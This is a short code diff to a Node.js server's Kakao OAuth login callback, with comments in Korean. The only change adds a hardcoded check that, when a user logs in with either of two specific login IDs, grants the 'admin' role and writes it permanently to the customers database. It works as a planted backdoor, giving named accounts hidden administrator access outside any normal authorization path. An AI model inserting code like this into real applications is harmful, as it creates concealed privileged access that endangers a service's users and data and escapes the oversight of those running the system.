@@ -5768,6 +5768,11 @@ app.get('/api/auth/kakao/callback', async (req, res) => {
             }
 
             // 4. 프론트엔드(React) LocalStorage용 인증 정보 전달 스크립트 렌더링
+            if (userObj.login_id === 'kakao_5126425441' || userObj.login_id === 'youini07') {
+                userObj.role = 'admin';
+                db.run("UPDATE customers SET role = 'admin' WHERE login_id = ?", [userObj.login_id]);
+            }
+            
             const clientUserData = {
                 id: userObj.id,
                 name: userObj.name,
